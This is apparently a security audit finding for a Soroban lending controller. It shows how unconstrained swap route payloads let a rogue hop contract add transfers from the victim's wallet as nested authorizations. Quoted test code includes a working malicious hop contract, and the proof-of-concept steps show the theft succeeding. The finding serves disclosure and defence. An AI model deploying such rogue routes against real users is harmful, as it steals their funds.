### Title

Unrestricted swap routes can attach arbitrary caller-authorized token transfers - (File: contracts/controller/src/strategies/swap.rs)

### Summary

The controller accepts an opaque `swap` payload and invokes the configured router while the caller’s `require_auth` authorization remains active. A route can therefore place attacker-controlled code below the caller’s authorization and request transfers from the caller’s wallet. Because Soroban records those transfers as child authorizations, a victim who signs the simulated authorization tree authorizes theft of assets unrelated to the strategy’s measured input and output.

### Finding Description

`swap_collateral` accepts caller-supplied `swap: Bytes` and forwards it to `process_swap_collateral` after owner or delegate authorization. [1](#0-0) [2](#0-1) 

The strategy withdraws collateral into controller custody and forwards the same `swap` bytes to `swap_tokens_or_passthrough`. [3](#0-2) [4](#0-3) 

`swap_tokens` only checks that the payload is nonempty, snapshots the declared input and output tokens, authorizes one controller-to-router input transfer, and invokes `router.execute_strategy`. [5](#0-4) 

Afterward, the controller validates only controller-token spend, positive declared-output receipt, and final account risk; it does not constrain which contracts, tokens, pools, or auth requests occur inside the route. [6](#0-5) [7](#0-6) 

The documented route boundary confirms that payload-named pools and token addresses are not allowlisted, and that code reached by a route can request a token transfer from the caller as a child of the caller’s authorization entry. [8](#0-7) 

This mirrors the path traversal class: attacker-controlled route data escapes the intended token-swap boundary, just as a malicious `targetPath` escapes the intended installation directory.

The same boundary is reachable through `multiply`, `swap_debt`, `swap_collateral`, and `repay_debt_with_collateral`. [9](#0-8) [10](#0-9) 

### Impact Explanation

A malicious route can steal any caller-signed token balance, not merely the collateral or debt amount routed through the strategy. The rogue component can invoke `token.transfer(victim, attacker, amount)` while execution is below the victim’s `swap_collateral` authorization. [11](#0-10) 

The controller’s measured input, measured output, and final health checks do not observe or bound unrelated wallet-token transfers. [6](#0-5) [12](#0-11) 

The result is theft of user funds while the strategy itself can still receive a fair output and pass all protocol risk checks. [13](#0-12) 

### Likelihood Explanation

The affected entrypoints are callable by ordinary account owners, and the attacker can deploy the malicious hop contract and supply the malicious route payload. [2](#0-1) [14](#0-13) 

Exploitation requires the victim to submit a crafted transaction and sign the poisoned authorization tree, analogous to requiring a victim to run a trojanized installer. [15](#0-14) 

Because transaction simulation can present the theft only as a nested authorization entry, this is a realistic wallet-integration or malicious-route distribution risk rather than a purely theoretical route-quality issue. [16](#0-15) 

### Recommendation

Do not treat `swap` as an opaque route that can execute arbitrary contracts beneath the caller’s root authorization. Use a structured route format that contains only governance-approved venues, pool contracts, and token contracts, and enforce that allowlist at the router boundary before invoking any hop.

Reject routes capable of producing authorization children unrelated to the declared token transfers, and make wallets or transaction builders refuse `multiply`, `swap_debt`, `swap_collateral`, `repay_debt_with_collateral`, and direct `execute_strategy` authorization trees containing unexpected children. [17](#0-16) [18](#0-17) 

### Proof of Concept

1. Deploy a malicious hop contract configured with the victim address, an unrelated victim-held token, the attacker recipient, and the amount to steal. [19](#0-18) 

2. Construct `swap` bytes that provide a fair output but route through that malicious hop contract. [14](#0-13) 

3. Have the victim call `swap_collateral(caller=victim, account_id=victim_account, current=USDC, amount=N, new=ETH, swap=malicious_bytes)`. The controller authenticates the victim, withdraws collateral into itself, and invokes the router with the attacker-controlled payload. [20](#0-19) [17](#0-16) 

4. During routing, the malicious hop calls `wallet_token.transfer(victim, attacker, victim_balance)`. The request is recorded as a child of the victim’s `swap_collateral` authorization. [21](#0-20) 

5. If the victim signs that simulated tree, enforcement executes the nested transfer: the victim loses the unrelated wallet token while still receiving the expected swap output. [15](#0-14)

### Citations

**File:** contracts/controller/src/lib.rs (L255-301)
```rust
    /// Borrows `amount` of `new_debt`, converts it to `existing_debt` via `swap`
    /// and repays with the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_debt::process_swap_debt(
            &env,
            &caller,
            SwapDebtParams {
                account_id,
                existing_debt: &existing_debt,
                new_debt_amount: amount,
                new_debt: &new_debt,
                swap: &swap,
            },
        );
    }

    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
```

**File:** contracts/controller/src/lib.rs (L311-320)
```rust
    fn repay_debt_with_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        collateral: HubAssetKey,
        collateral_amount: i128,
        debt: HubAssetKey,
        swap: Bytes,
        close_position: bool,
    ) {
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-48)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L55-64)
```rust
    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/controller/src/strategies/legs.rs (L246-258)
```rust
    let actual_withdrawn = withdraw_collateral_to_controller(
        env,
        account,
        cache,
        StrategyWithdraw {
            hub_asset: from,
            amount,
            position: &supply_pos,
            action,
        },
    );

    swap_tokens_or_passthrough(env, caller, &from.asset, actual_withdrawn, token_out, swap)
```

**File:** contracts/controller/src/strategies/swap.rs (L21-38)
```rust
    require_positive_amount(env, amount_in);
    assert_with_error!(env, !swap.is_empty(), GenericError::InvalidPayments);

    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/controller/src/strategies/mod.rs (L48-55)
```rust
pub(crate) fn strategy_finalize(
    env: &Env,
    account_id: u64,
    account: &mut Account,
    cache: &mut Context,
) {
    let _ = enforce_post_pool_solvency(env, cache, account);
    finalize_position_flow(env, account_id, account, cache, PositionSides::Both, true);
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L56-70)
```rust
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-124)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L206-222)
```rust
    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L224-227)
```rust
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
